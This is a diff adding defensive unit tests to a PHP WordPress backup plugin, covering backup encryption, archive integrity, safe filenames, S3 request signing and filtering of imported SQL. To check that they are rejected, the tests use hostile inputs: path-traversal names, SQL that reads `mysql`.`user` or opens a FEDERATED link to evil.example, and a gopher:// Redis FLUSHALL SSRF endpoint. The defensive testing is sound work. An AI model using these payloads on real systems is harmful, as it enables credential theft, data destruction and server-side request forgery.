@@ -683,6 +683,210 @@ file_put_contents( "$bdir/site-01012026-Abc.wpress.peek", 'plain copy' );
 t( 'K3 backup and its .peek both removed', ISX_Backups::delete( 'site-01012026-Abc.wpress' ) && ! file_exists( "$bdir/site-01012026-Abc.wpress" ) && ! file_exists( "$bdir/site-01012026-Abc.wpress.peek" ) );
 t( 'K4 backups dir always gets an index.php', is_file( "$bdir/index.php" ) );
 
+// ---------- stubs used by the groups below (real classes, no WordPress) ----------
+if ( ! class_exists( 'WP_Error' ) ) {
+	class WP_Error {
+		private $c; private $m;
+		public function __construct( $c = '', $m = '' ) { $this->c = $c; $this->m = $m; }
+		public function get_error_code() { return $this->c; }
+		public function get_error_message() { return $this->m; }
+	}
+}
+if ( ! function_exists( 'is_wp_error' ) ) { function is_wp_error( $x ) { return $x instanceof WP_Error; } }
+if ( ! function_exists( 'wp_salt' ) ) { function wp_salt( $s = 'auth' ) { return isset( $GLOBALS['isx_salt'] ) ? $GLOBALS['isx_salt'] : 'unit-salt'; } }
+if ( ! function_exists( 'wp_parse_url' ) ) { function wp_parse_url( $u, $c = -1 ) { return parse_url( $u, $c ); } }
+if ( ! function_exists( 'home_url' ) ) { function home_url( $p = '' ) { return 'https://shop.example.com/' . ltrim( $p, '/' ); } }
+if ( ! function_exists( 'wp_generate_password' ) ) { function wp_generate_password( $n = 12 ) { $a = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; $o = ''; for ( $i = 0; $i < $n; $i++ ) { $o .= $a[ random_int( 0, 61 ) ]; } return $o; } }
+require_once $PLUGIN . '/includes/class-isx-crypto.php';
+require_once $PLUGIN . '/includes/class-isx-destinations.php';
+require_once $PLUGIN . '/includes/class-isx-s3-client.php';
+
+// =====================================================================
+group( 'Crypto: backup encryption and stored secrets' );
+// =====================================================================
+$enc = ISX_Crypto::encrypt_string( 's3-secret' );
+t( 'C1 secret round-trips and is never stored plain', $enc !== 's3-secret' && strpos( $enc, 'ISXENC1:' ) === 0 && ISX_Crypto::decrypt_string( $enc ) === 's3-secret' );
+t( 'C2 already-encrypted value is not double-encrypted', ISX_Crypto::encrypt_string( $enc ) === $enc );
+$GLOBALS['isx_salt'] = 'other-site';
+t( 'C3 another site\'s salt cannot read it', ISX_Crypto::decrypt_string( $enc ) !== 's3-secret' );
+unset( $GLOBALS['isx_salt'] );
+
+$plain_pkg = $JOB_DIR . '/crypto-plain.wpress';
+@unlink( $plain_pkg );
+ISX_Archive::init( $plain_pkg );
+ISX_Archive::add_data( $plain_pkg, 'wpcontent/uploads/a.txt', str_repeat( 'payload-', 300000 ) ); // > 1 chunk
+ISX_Archive::finish( $plain_pkg );
+$sealed = $JOB_DIR . '/crypto-sealed.wpress';
+$opened = $JOB_DIR . '/crypto-opened.wpress';
+t( 'C4 encrypt_file writes the authenticated v2 container', ISX_Crypto::encrypt_file( 'pa55 word', $plain_pkg, $sealed ) === true && file_get_contents( $sealed, false, null, 0, 8 ) === 'ISXENC02' && ISX_Crypto::is_encrypted_file( $sealed ) );
+t( 'C5 right password restores the package byte-for-byte', ISX_Crypto::decrypt_file( 'pa55 word', $sealed, $opened ) === true && hash_file( 'sha256', $opened ) === hash_file( 'sha256', $plain_pkg ) );
+@unlink( $opened );
+$r = ISX_Crypto::decrypt_file( 'wrong', $sealed, $opened );
+t( 'C6 wrong password → error, no output file left', is_wp_error( $r ) && ! file_exists( $opened ) );
+$bytes = file_get_contents( $sealed );
+$bytes[ 2000 ] = chr( ord( $bytes[ 2000 ] ) ^ 1 );
+file_put_contents( "$sealed.tampered", $bytes );
+$r = ISX_Crypto::decrypt_file( 'pa55 word', "$sealed.tampered", $opened );
+t( 'C7 one flipped bit anywhere → rejected (HMAC), no output', is_wp_error( $r ) && ! file_exists( $opened ) );
+file_put_contents( "$sealed.short", substr( file_get_contents( $sealed ), 0, -40 ) );
+t( 'C8 truncated container rejected', is_wp_error( ISX_Crypto::decrypt_file( 'pa55 word', "$sealed.short", $opened ) ) && ! file_exists( $opened ) );
+t( 'C9 a plain package is not mistaken for an encrypted one', ! ISX_Crypto::is_encrypted_file( $plain_pkg ) && is_wp_error( ISX_Crypto::decrypt_file( 'x', $plain_pkg, $opened ) ) );
+// Legacy v1 (pre-HMAC) containers must still open.
+$salt = random_bytes( 16 );
+$key  = hash_pbkdf2( 'sha256', 'old pw', $salt, 100000, 32, true );
+$v1   = 'ISXENC01' . $salt;
+foreach ( str_split( file_get_contents( $plain_pkg ), 1048576 ) as $chunk ) {
+	$iv  = random_bytes( 16 );
+	$ct  = openssl_encrypt( $chunk, 'aes-256-cbc', $key, OPENSSL_RAW_DATA, $iv );
+	$v1 .= $iv . pack( 'N', strlen( $ct ) ) . $ct;
+}
+file_put_contents( "$sealed.v1", $v1 );
+t( 'C10 legacy ISXENC01 backups still decrypt', ISX_Crypto::decrypt_file( 'old pw', "$sealed.v1", $opened ) === true && hash_file( 'sha256', $opened ) === hash_file( 'sha256', $plain_pkg ) );
+foreach ( array( $plain_pkg, $sealed, "$sealed.tampered", "$sealed.short", "$sealed.v1", $opened ) as $f ) {
+	@unlink( $f );
+}
+
+// =====================================================================
+group( 'Archive: write, verify, corruption detection' );
+// =====================================================================
+$arcv = $JOB_DIR . '/verify.wpress';
+@unlink( $arcv );
+ISX_Archive::init( $arcv );
+file_put_contents( $JOB_DIR . '/empty.bin', '' );
+file_put_contents( $JOB_DIR . '/text.css', str_repeat( 'body{color:red}', 500 ) );
+ISX_Archive::add_file( $arcv, $JOB_DIR . '/empty.bin', 'wpcontent/uploads/empty.bin', false );
+ISX_Archive::add_file( $arcv, $JOB_DIR . '/text.css', 'wpcontent/themes/t/style.css', true );
+ISX_Archive::add_data( $arcv, 'database.sql', "CREATE TABLE `wp_x` (id int);\n" );
+ISX_Archive::finish( $arcv );
+$v = ISX_Archive::verify_batch( $arcv, ISX_Archive::first_offset(), microtime( true ) + 30 );
+t( 'A1 intact package verifies (incl. 0-byte + compressed entries)', $v['ok'] && $v['done'] && $v['entries'] === 3, json_encode( $v ) );
+$names = array();
+ISX_Archive::each( $arcv, function ( $h, $fh ) use ( &$names ) { $names[] = $h['p']; return true; } );
+t( 'A2 entries listed in order', $names === array( 'wpcontent/uploads/empty.bin', 'wpcontent/themes/t/style.css', 'database.sql' ), json_encode( $names ) );
+$raw = file_get_contents( $arcv );
+$at  = strpos( $raw, 'CREATE TABLE' );
+$raw[ $at + 3 ] = 'X';
+file_put_contents( "$arcv.bad", $raw );
+$v = ISX_Archive::verify_batch( "$arcv.bad", ISX_Archive::first_offset(), microtime( true ) + 30 );
+t( 'A3 a changed byte fails the CRC check', ! $v['ok'] && $v['error'] !== '', json_encode( $v ) );
+file_put_contents( "$arcv.cut", substr( file_get_contents( $arcv ), 0, -30 ) );
+$v = ISX_Archive::verify_batch( "$arcv.cut", ISX_Archive::first_offset(), microtime( true ) + 30 );
+t( 'A4 a truncated package fails verification', ! $v['ok'] );
+t( 'A5 is_valid() only for real packages', ISX_Archive::is_valid( $arcv ) && ! ISX_Archive::is_valid( $JOB_DIR . '/text.css' ) );
+foreach ( array( $arcv, "$arcv.bad", "$arcv.cut", $JOB_DIR . '/empty.bin', $JOB_DIR . '/text.css' ) as $f ) {
+	@unlink( $f );
+}
+
+// =====================================================================
+group( 'Backups: file names are unguessable and path-safe' );
+// =====================================================================
+@mkdir( $JOB_DIR . '/st', 0777, true );
+file_put_contents( $JOB_DIR . '/st/archive.wpress', 'pkg' );
+$n1 = ISX_Backups::store( $JOB_DIR . '/st/archive.wpress' );
+t( 'N1 stored name = host-date-<16 random>.wpress', is_string( $n1 ) && preg_match( '/^shop\.example\.com-\d{8}-[A-Za-z0-9]{16}\.wpress$/', $n1 ), (string) $n1 );
+foreach ( array( '../../wp-config.php', '../x.wpress', 'a/b.wpress', 'x.wpress.php', "a\0.wpress", '.wpress', 'ok name.wpress' ) as $bad ) {
+	t( 'N2 rejected name ' . json_encode( $bad ), ISX_Backups::sanitize_name( $bad ) === '' || strpos( ISX_Backups::sanitize_name( $bad ), '/' ) === false && ISX_Backups::path( $bad ) === null );
+}
+t( 'N3 a real backup resolves', ISX_Backups::path( $n1 ) !== null );
+t( 'N4 retention only counts this site\'s backups', ISX_Backups::is_own_backup_name( 'shop-01012026-AbCdEfGhIjKlMnOp.wpress', 'shop' )
+	&& ! ISX_Backups::is_own_backup_name( 'shop-2-01012026-AbCdEfGhIjKlMnOp.wpress', 'shop' )
+	&& ! ISX_Backups::is_own_backup_name( 'shop-01012026-short.wpress', 'shop' )
+	&& ISX_Backups::is_own_backup_name( $n1, 'shop.example.com' ) );
+ISX_Backups::delete( $n1 );
+
+// =====================================================================
+group( 'S3 SigV4 matches the AWS reference example' );
+// =====================================================================
+// "GET Bucket Lifecycle" from the AWS Signature Version 4 examples: the same
+// signed-header set (host;x-amz-content-sha256;x-amz-date) this client uses.
+$s3 = new ISX_S3_Client( array( 'region' => 'us-east-1', 'bucket' => 'examplebucket', 'access_key' => 'AKIAIOSFODNN7EXAMPLE', 'secret_key' => 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY' ) );
+$sh = new ReflectionMethod( 'ISX_S3_Client', 'signed_headers' );
+if ( PHP_VERSION_ID < 80100 ) {
+	$sh->setAccessible( true );
+}
+$hdrs = $sh->invoke( $s3, 'GET', 'examplebucket.s3.amazonaws.com', '/', 'lifecycle=', 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', gmmktime( 0, 0, 0, 5, 24, 2013 ) );
+$auth = (string) end( $hdrs );
+t( 'V1 Authorization matches the published signature', strpos( $auth, 'Signature=fea454ca298b7da1c68078a5d1bdbfbbe0d65c699e0f91ac7a200a0136783543' ) !== false, $auth );
+t( 'V2 credential scope and signed headers as documented', strpos( $auth, 'Credential=AKIAIOSFODNN7EXAMPLE/20130524/us-east-1/s3/aws4_request, SignedHeaders=host;x-amz-content-sha256;x-amz-date' ) !== false );
+
+// =====================================================================
+group( 'SQL from a package can only touch this site\'s own tables' );
+// =====================================================================
+function isx_sql_case( array $lines ) {
+	$proc = proc_open( array( PHP_BINARY, __DIR__ . '/sql-case.php' ), array( 0 => array( 'pipe', 'r' ), 1 => array( 'pipe', 'w' ), 2 => array( 'pipe', 'w' ) ), $pipes );
+	fwrite( $pipes[0], json_encode( $lines ) );
+	fclose( $pipes[0] );
+	$out = stream_get_contents( $pipes[1] );
+	$err = stream_get_contents( $pipes[2] );
+	proc_close( $proc );
+	$sent = json_decode( (string) $out, true );
+	return is_array( $sent ) ? $sent : array( 'ERROR: ' . $out . $err );
+}
+$sent = isx_sql_case( array(
+	"CREATE TABLE `wp_posts` (`ID` bigint(20) unsigned NOT NULL, PRIMARY KEY (`ID`)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;",
+	"INSERT INTO `wp_posts` (`ID`) VALUES ('1');",
+	"/*!40101 SET NAMES utf8mb4 */;",
+) );
+t( 'Q1 normal dump lines still run', count( $sent ) === 4 && strpos( $sent[1], 'CREATE TABLE `wp_posts`' ) === 0 && strpos( $sent[2], 'INSERT INTO `wp_posts`' ) === 0, json_encode( $sent ) );
+$sent = isx_sql_case( array(
+	"CREATE TABLE `orders` (id int);",
+	"INSERT INTO `orders` (`id`) VALUES ('1');",
+) );
+t( 'Q2 tables outside the site prefix are neither dropped, created nor written', $sent === array(), json_encode( $sent ) );
+$sent = isx_sql_case( array(
+	"CREATE TABLE `wp_staging_users` (ID int);",
+	"INSERT INTO `wp_staging_users` (`ID`,`user_login`) VALUES ('1','evil');",
+) );
+t( 'Q3 another install sharing the DB (wp_staging_) cannot be overwritten', $sent === array(), json_encode( $sent ) );
+$sent = isx_sql_case( array(
+	"CREATE TABLE `wp_leak` AS SELECT * FROM `mysql`.`user`;",
+	"CREATE TABLE `wp_fed` (id int) ENGINE=FEDERATED CONNECTION='mysql://u:p@evil.example:3306/db/t';",
+	"CREATE TABLE `wp_dir` (id int) DATA DIRECTORY='/tmp/x';",
+) );
+t( 'Q4 CREATE TABLE … SELECT / FEDERATED / DATA DIRECTORY refused', $sent === array(), json_encode( $sent ) );
+$sent = isx_sql_case( array(
+	"SET NAMES gbk;",
+	"SET NAMES utf8mb4, @x = (SELECT 1);",
+) );
+t( 'Q5 only safe charsets in SET NAMES, nothing appended', $sent === array(), json_encode( $sent ) );
+$sent = isx_sql_case( array(
+	"CREATE TABLE `wp_a'` SELECT user_pass AS `'` FROM other_db.wp_users;",
+	"CREATE TABLE `wp_b` (id int) /*!50000SELECT*/ 1;",
+	"CREATE TABLE `wp_c2` (id int) ENGINE='FEDERATED' COMMENT='mysql://u@evil/d/t';",
+	"CREATE TABLE `wp_d` TABLE other_db.t;",
+) );
+t( 'Q7 review bypasses (quote in identifier, /*! */, quoted engine, TABLE clause) refused', $sent === array(), json_encode( $sent ) );
+$sent = isx_sql_case( array( "CREATE TABLE `wp_STAGING_users` (ID int);", "INSERT INTO `WP_staging_users` (`ID`) VALUES ('1');" ) );
+t( 'Q8 changing case cannot reach another install (case-insensitive MySQL)', $sent === array(), json_encode( $sent ) );
+$sent = isx_sql_case( array( "CREATE TABLE `wp_c` (`note` varchar(20) DEFAULT 'select me') ENGINE=InnoDB;" ) );
+t( 'Q6 the word SELECT inside a quoted default is fine', count( $sent ) === 2, json_encode( $sent ) );
+
+// =====================================================================
+group( 'Storage connection cannot point requests at other hosts/protocols' );
+// =====================================================================
+if ( ! function_exists( 'esc_url_raw' ) ) {
+	function esc_url_raw( $url, $protocols = null ) {
+		$scheme  = strtolower( (string) parse_url( $url, PHP_URL_SCHEME ) );
+		$allowed = $protocols ? $protocols : array( 'http', 'https', 'ftp', 'gopher', 'telnet' );
+		return ( $url !== '' && in_array( $scheme, $allowed, true ) ) ? $url : '';
+	}
+}
+if ( ! function_exists( 'sanitize_text_field' ) ) { function sanitize_text_field( $s ) { return trim( strip_tags( (string) $s ) ); } }
+require_once $PLUGIN . '/includes/class-isx-destinations.php';
+ISX_Destinations::save( array( 'minio' => array( 'endpoint' => 'gopher://127.0.0.1:6379/_FLUSHALL', 'bucket' => 'evil.example/?x=', 'access_key' => 'a', 'secret_key' => 's' ) ) );
+$saved = get_option( ISX_Destinations::OPTION_KEY );
+t( 'W1 non-http(s) endpoint dropped on save (SSRF)', $saved['minio']['endpoint'] === '', json_encode( $saved['minio']['endpoint'] ) );
+t( 'W2 bucket reduced to DNS-safe characters (no host injection)', $saved['minio']['bucket'] === 'evil.examplex', $saved['minio']['bucket'] );
+t( 'W3 the S3 secret is stored encrypted', strpos( (string) $saved['minio']['secret_key'], 'ISXENC1:' ) === 0 );
+$legacy = new ISX_S3_Client( array( 'endpoint' => 'gopher://127.0.0.1:6379', 'bucket' => 'b@evil:80', 'access_key' => 'a', 'secret_key' => 's' ) );
+$prop = function ( $o, $n ) { $r = new ReflectionProperty( $o, $n ); if ( PHP_VERSION_ID < 80100 ) { $r->setAccessible( true ); } return $r->getValue( $o ); };
+t( 'W4 a stored non-http endpoint is still requested over https only', $prop( $legacy, 'scheme' ) === 'https' );
+t( 'W5 ...and a stored unsafe bucket is cleaned in the client too', $prop( $legacy, 'bucket' ) === 'bevil80' );
+$ps = new ISX_S3_Client( array( 'endpoint' => 'http://minio.local:9000', 'bucket' => 'backups/site1', 'path_style' => true, 'access_key' => 'a', 'secret_key' => 's' ) );
+t( 'W6 existing path-style "bucket/folder" setups keep working', $prop( $ps, 'bucket' ) === 'backups/site1' );
+$vh = new ISX_S3_Client( array( 'endpoint' => 'https://s3.example', 'bucket' => 'evil.example/x', 'path_style' => false, 'access_key' => 'a', 'secret_key' => 's' ) );
+t( 'W7 virtual-hosted buckets can never carry "/" into the host', $prop( $vh, 'bucket' ) === 'evil.examplex' );
+
 // =====================================================================
 group( 'I18N: every t() string in assets/js is localized by ISX_Admin::js_i18n()' );
 
